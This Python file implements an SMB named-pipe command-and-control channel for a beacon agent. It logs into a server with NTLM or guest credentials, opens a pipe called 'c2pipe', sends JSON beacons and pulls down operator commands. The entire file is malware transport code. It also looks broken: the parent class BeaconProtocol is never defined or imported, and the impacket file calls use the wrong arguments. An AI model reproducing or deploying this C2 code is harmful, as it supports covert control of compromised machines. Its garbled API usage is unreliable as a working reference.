#!/usr/bin/env python3
"""
SMB Protocol Handler - SMB-based C2 Communication
Features: Named pipes, SMB shares for C2 communication
"""

import os
import sys
import time
import json
import threading
from typing import Optional, Dict, List
import socket
import struct

try:
    import impacket
    from impacket.smb import SMB
    from impacket.smbconnection import SMBConnection
except ImportError:
    print("[!] impacket not installed. Install with: pip install impacket")

class SMBProtocol:
    """SMB protocol handler for C2 communication"""
    
    # SMB named pipe
    PIPE_NAME = "c2pipe"
    SHARE_NAME = "C2SHARE"
    
    def __init__(self, server: str, username: str = "", password: str = "", 
                 domain: str = "", use_ntlm: bool = True):
        self.server = server
        self.username = username
        self.password = password
        self.domain = domain
        self.use_ntlm = use_ntlm
        self.beacon_id = None
        self.connection = None
        self.pipe_handle = None
        
    def connect(self) -> bool:
        """Connect to SMB server"""
        try:
            self.connection = SMBConnection(self.server, self.server, timeout=30)
            
            if self.use_ntlm:
                # NTLM authentication
                self.connection.login(self.username, self.password, self.domain)
            else:
                # Guest login
                self.connection.login("", "")
            
            # Try to connect to named pipe
            self.pipe_handle = self.connection.openFile(
                self.PIPE_NAME,
                desiredAccess=0x0012019F,  # Generic read/write
                creationDisposition=1,      # Open existing
                flags=0x00000020,           # Write through
                attributes=0x00000080
            )
            
            return True
        except Exception as e:
            return False
    
    def disconnect(self):
        """Disconnect from SMB"""
        try:
            if self.pipe_handle:
                self.connection.closeFile(self.pipe_handle)
            if self.connection:
                self.connection.disconnect()
        except:
            pass
    
    def send_data(self, data: bytes) -> bool:
        """Send data via SMB"""
        try:
            if self.connection and self.pipe_handle:
                # Write data to pipe
                self.connection.writeFile(
                    self.SHARE_NAME,
                    self.PIPE_NAME,
                    data,
                    offset=0
                )
                return True
        except:
            pass
        return False
    
    def receive_data(self, size: int = 4096) -> Optional[bytes]:
        """Receive data via SMB"""
        try:
            if self.connection and self.pipe_handle:
                # Read data from pipe
                data = self.connection.readFile(
                    self.SHARE_NAME,
                    self.PIPE_NAME,
                    offset=0,
                    size=size
                )
                return data
        except:
            pass
        return None


class SMBBeaconProtocol(BeaconProtocol):
    """SMB beacon protocol for C2 agent"""
    
    def __init__(self, server: str, port: int, username: str = "", 
                 password: str = "", domain: str = ""):
        super().__init__(server, port)
        self.smb = SMBProtocol(server, username, password, domain)
        self.smb.connect()
        
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon via SMB"""
        try:
            json_data = json.dumps(data).encode()
            if self.smb.send_data(json_data):
                return "beacon_sent"
        except:
            pass
        return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via SMB"""
        try:
            data = self.smb.receive_data()
            if data:
                return json.loads(data)
        except:
            pass
        return None
